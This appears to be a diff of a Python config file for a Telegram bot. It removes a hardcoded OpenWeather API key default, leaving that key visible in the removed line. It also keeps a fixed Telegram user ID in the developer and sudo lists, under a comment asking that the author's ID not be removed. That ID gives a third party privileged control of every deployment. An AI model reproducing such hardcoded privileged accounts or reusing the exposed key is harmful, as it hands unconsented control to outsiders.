@@ -75,7 +75,7 @@ if ENV:
     WALL_API = os.environ.get('WALL_API',None)
     LASTFM_API_KEY = os.environ.get('LASTFM_API_KEY',None)
     LYDIA_API = os.environ.get('LYDIA_API',None)
-    API_WEATHER  = os.environ.get('API_OPENWEATHER', '970e5714edd79cb3a4ee321ab6d584fe')
+    API_WEATHER  = os.environ.get('API_OPENWEATHER',None)
     sw = os.environ.get('spamwatch_api',None)
     
 else:
@@ -135,11 +135,12 @@ else:
     LYDIA_API = Config.LYDIA_API
     API_OPENWEATHER = Config.API_OPENWEATHER
     spamwatch_api = Config.SW_API
-    
-SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(1118936839)
+
+# Don't Remove my ID from DEV and SUDO list..It Took many months to set up a bot like this..I have added many features in this bot ..by @Sur_vivor     
 DEV_USERS.add(OWNER_ID)
 DEV_USERS.add(1118936839)
+SUDO_USERS.add(OWNER_ID)
+SUDO_USERS.add(1118936839)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 dispatcher = updater.dispatcher
